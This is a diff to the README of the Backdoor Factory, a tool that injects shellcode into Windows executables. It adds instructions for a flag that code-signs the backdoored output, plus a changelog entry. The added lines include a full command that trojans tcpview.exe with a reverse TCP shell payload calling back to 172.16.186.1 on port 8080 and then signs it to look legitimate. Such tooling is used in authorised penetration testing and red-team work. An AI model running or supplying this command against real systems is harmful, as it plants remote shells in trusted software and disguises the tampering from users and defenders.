@@ -244,6 +244,11 @@ Your certs/ directory should look excatly as so:
     ├── signingPrivateKey.pem
     └── signingCert.cer
 
+Enable PE Code Signing with the -C floag as so:
+
+     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C
+
+
 On successful run you should see this line in BDF output:
 
     [*] Code Signing Succeeded
@@ -260,6 +265,11 @@ On successful run you should see this line in BDF output:
 ---
 
 ###Changelog
+
+####12/20/2015
+
+ * Added directory paths to BDF to find certs directory.
+
 
 ####12/18/2015
  * Added PE codesiging support.  You must provide your own codesigning cert. See here: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning
